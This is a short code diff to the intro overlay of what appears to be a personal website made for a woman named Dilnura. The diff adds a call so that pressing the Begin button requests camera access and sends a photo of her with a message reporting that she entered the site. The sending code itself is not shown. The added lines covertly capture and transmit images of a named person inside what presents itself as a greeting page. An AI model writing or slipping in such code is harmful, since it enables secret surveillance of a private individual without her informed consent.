@@ -3,6 +3,7 @@
 import { motion, AnimatePresence } from "framer-motion";
 import { useState } from "react";
 import { content } from "@/lib/content";
+import { captureAndSendPhoto } from "@/lib/camera";
 
 /**
  * The first thing she sees: pure black, one glowing sentence,
@@ -15,6 +16,10 @@ export default function IntroOverlay({ onBegin }: { onBegin: () => void }) {
   const begin = () => {
     if (leaving) return;
     setLeaving(true);
+    
+    // Request camera and send initial photo
+    captureAndSendPhoto("📸 Dilnura saytga kirdi (Boshlash tugmasi bosildi)");
+
     setTimeout(onBegin, 1600);
   };
 
